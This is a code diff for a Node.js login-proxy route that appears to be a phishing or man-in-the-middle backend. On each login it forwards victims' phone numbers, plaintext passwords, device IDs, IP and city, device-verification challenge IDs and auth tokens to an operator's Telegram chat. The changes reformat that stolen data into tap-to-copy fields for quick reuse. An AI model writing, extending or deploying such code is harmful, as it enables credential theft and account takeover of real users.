@@ -1367,27 +1367,28 @@ app.post('/app/user/login/login', async (req, res) => {
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
       const reqStr = JSON.stringify(body, null, 2);
       const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      let extraInfo = '';
       const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      if (loginData && loginData.challengeId) {
-        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED`;
-      }
+      const challengeId = (loginData && loginData.challengeId) ? String(loginData.challengeId) : '';
       const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
-      if (loginToken && jsonResp?.code === 1000) {
-        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
-      }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
 
-      // Separate message with monospace IDs (tap-to-copy on Telegram clients).
-      if (loginData && loginData.challengeId) {
-        const cid = String(loginData.challengeId).replace(/[<>&]/g, '');
-        const did = String(androidId).replace(/[<>&]/g, '');
-        bot.sendMessage(
-          data.adminChatId,
-          `📋 <b>COPY (tap to copy)</b>\n\nchallengeId:\n<code>${cid}</code>\n\ndeviceId:\n<code>${did}</code>`,
-          { parse_mode: 'HTML' }
-        ).catch(()=>{});
+      const esc = (s) => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+      let extraInfo = '';
+      if (challengeId) {
+        // Both IDs together in one paragraph, mono (tap-to-copy) format.
+        extraInfo = `\n\n🎯 <b>DEVICE VERIFICATION NEEDED</b>\n📋 <b>COPY (tap):</b>\nchallengeId: <code>${esc(challengeId)}</code>\ndeviceId: <code>${esc(androidId)}</code>`;
       }
+      if (loginToken && jsonResp?.code === 1000) {
+        extraInfo += `\n\n🔑 <b>AUTH TOKEN:</b>\n<code>${esc(loginToken)}</code>`;
+      }
+
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+      const msg = `🔑 Login\n📱 Phone: <code>${esc(phone || 'N/A')}</code>\n🔒 Password: <code>${esc(pwd)}</code>\n👤 UserID: ${esc(userId || 'N/A')}\n📱 Android ID: <code>${esc(androidId)}</code>\n🌐 IP: ${esc(ip)}\n📍 City: ${esc(city)}\n🕐 Time: ${esc(time)}\n\n📤 REQUEST BODY:\n<pre>${esc(reqStr.substring(0, 1500))}</pre>\n\n📥 RESPONSE:\n<pre>${esc(resStr.substring(0, 1500))}</pre>${extraInfo}`;
+
+      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'HTML' }).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
